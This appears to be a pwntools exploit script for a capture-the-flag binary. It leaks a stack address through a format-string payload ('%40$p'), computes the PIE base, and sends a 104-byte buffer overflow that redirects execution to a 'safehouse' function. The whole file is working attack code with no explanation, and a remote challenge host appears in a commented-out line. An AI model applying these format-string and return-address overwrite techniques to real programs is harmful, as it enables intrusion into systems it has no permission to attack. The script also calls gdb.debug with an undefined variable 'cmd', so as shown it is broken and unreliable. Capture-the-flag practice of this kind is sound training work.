from pwn import *

# Load the ELF binary
elf = context.binary = ELF("./challenge")

# Buffer size determined from binary analysis
buffer_size = 104 

offset_from_base = 0x1316

# Offsets determined from binary analysis
safehouse_offset = 0x125A
ret_offset = 0x1016

# Start the binary under GDB to dynamically find the PIE base

p = gdb.debug(elf.path, cmd)

# p = process('./challenge')

# p = remote("rvcechalls.xyz", 27250)

p.sendlineafter("me: ", '%40$p')

p.recvuntil('Mr. ')
leaked_addr = int(p.recvline(), 16)
print("leaked_address: ", hex(leaked_addr))

elf.address = leaked_addr - offset_from_base

print("elf address: ", hex(elf.address))

# # Convert the leaked address from string to integer
# leaked_address = int(leaked_address, 16)

# # Calculate PIE base address using the leaked address and known offset of main
# pie_base = leaked_address - elf.symbols['main']
# print(f"PIE base address: {hex(pie_base)}")

# # Calculate the actual addresses of 'safehouse' and return address
safehouse_address = elf.address + safehouse_offset
ret_address = elf.address + ret_offset

# # Construct payload
payload = b'A' * buffer_size
payload += p64(ret_address)
payload += p64(safehouse_address)

print(payload)
# # Receive next prompt and send payload
# p.recvuntil(b"convey? ")
p.sendlineafter("convey? " , payload)

p.interactive()